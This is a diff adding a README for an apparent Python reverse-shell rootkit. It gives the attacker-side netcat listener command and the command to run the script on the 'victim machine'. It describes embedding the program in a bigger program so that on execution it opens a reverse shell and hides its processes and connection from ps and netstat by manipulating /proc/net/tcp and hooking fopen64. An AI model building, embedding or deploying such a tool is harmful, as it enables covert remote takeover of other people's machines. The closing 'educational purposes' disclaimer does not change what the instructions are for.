@@ -1,0 +1,18 @@
+You can run the program with the below commands:
+
+On the attacks machine you can run:
+    nc -lvnp 9001
+
+and on the victim machine you run:
+    python3 rvshell_rootkit.py
+or
+    python rvshell_rootkit_v2.py
+
+This program is an easter code that you can embed in a bigger program that when exectured gives you a reversell in the victims machine, and then proceeds to hide the procceses and connection from ps aux and netstat -tunap, by finding the pids of the procceses that run for the attack and also by manupulating the /proc/net/tcp file by exluting the connection and redirecting the fopen64 to our crafted tcp file. 
+
+Before running the program make sure the IP of the attacker machine is your desired ip and you can check yousing ps aux how your system desplays the processes, if they are not like the code you can make the right ajustments
+Also I have 2 versions one is running with python and the other with python3 make sure you select the right one for your example.
+
+Disclaimer:
+
+This program is intended for educational purposes only. It manipulates system-level processes and files, which can have significant implications. Users should operate it in a controlled environment and understand the risks involved.
